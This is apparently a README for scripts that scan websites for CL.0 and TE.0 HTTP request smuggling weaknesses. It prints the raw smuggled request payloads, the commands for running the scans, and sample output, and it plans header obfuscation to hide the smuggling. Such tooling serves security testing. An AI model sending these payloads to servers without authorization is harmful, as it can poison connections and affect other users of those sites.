# CL.0 and TE.0 Finder
Two scripts that together automate the manual task of finding CL0 vulnerable endpoints ([Technique](https://portswigger.net/web-security/request-smuggling/browser/cl-0) discovered by James Kettle). As a result of a specific behaviour in one of the Web Security Academy client desync labs, I also add a script to find TE.0 vulnerabilities in the wild and see what happens (this technique is thought to theoretically break as the smuggled request has to be sent with the chunk length as a prefix. For the chunk ending, i do not send the 0. Lets see what happens in the wild!).

## CL.0 Basic Technique

The FindCandidateURLs.py file, will first identify endpoints which return response codes we are interested in. So the first request is sent by FindCandidateURLs.py, and a base response code is identified.
Then, the smuggled request comes in, and after it, another request to the path and method FindCandidateURLs.py identified.
The smuggled request looks like this:

```bash
GET / HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html;q=0.8
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Length: 44

GET /thisPageDoesNotExist HTTP/1.1
Foo: Bar
```
If the request after the smuggled one, returns a response code that is different to the response code that was returned after sending the base request (sent by FindCandidateURLs.py), this is an interesting behaviour that should be manually tested. In the case of the GET method as a normal request, we try to desyn with GET, POST and PUT also.

## TE.0 Basic Technique

The methodology is the same as for CL.0, but the smuggled request is sent with a chunked encoding. The catch here, is that we send the final 0 which terminates the chunk, the TCP socket would be poisoned but with a broken request (The last 0 would be parsed as an invalid header). By not sending the 0, an application may incorrectly parse the payload as a smuggled request. There should still a problem with the length of the chunk which should brake the smuggled request. This technique is tested like this, because it worked in the Web Security Academy labs, and maybe, it works in some particular servers. The smuggled request is like the following:

```bash
GET / HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html;q=0.8
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: keep-alive
Transfer-Encoding: chunked

2c
GET /thisPageDoesNotExist HTTP/1.1
Foo: Bar
0\r\n\r\n
```

## Usage
The best and easy way to use this tool, is to navigate any target you want proxying the traffic through Burp Suite, and export all the intercepted links **Dashboard** -> **Target** -> **Right click on your target** -> **Copy links in this host**. Its better to include every static asset such as .js and .css files, as CL0 vulnerabilities sometimes arise from specific requests to these files.
After this, save every URL to a file and execute **FindCandidateURLs.py** specifying that file (-u), saving the output (-o) to a new file like this:

```bash
python3 FindCandidateURLs.py -u urlsToTest -o urls
```

This script will save the candidate URLs in the form of `URL-Method-ResponseCode` like this `https://github.com/trending?spoken_language_code=cr-PUT-422`.
After the candidate urls file has been generated, execute **CL0Finder.py** specifying that file (-u) like this:
```bash
python3 CL0Finder.py -u urls
```
The output will be a message indicating what the response code for the smuggled request was, and the response code for the follow up request, like this:

```bash
[200] - The response code for /trending?spoken_language_code=cr is 422 and after CL0 is 404 for method PUT
```

* [200] Means that the first normal request to the url (issued by FindCandidateURLs.py), generated a 200 OK response.
* 422 means that the response code to the smuggled request was 422 Unprocesable Entity
* 404 means that the follow up request generated a 404 Not Found response code

By seeing these three response codes, we see there is an odd behaviour as the follow up request that is sent after the smuggled request, generates a 404 response code, and by sending a normal request, we receive a 200 response code. This is a nice clue of an endpoint we should test to see if indeed is vulnerable to CL0.

## TO DO:

* Add obfuscation techniques in order to trigger the hiding of CL and TE headers (same as in common HTTP Desync attacks).
* Add threading.
* Mutiple refactoring (this scripts were recently created so it may change frequently).
* Add support for logged in requests.
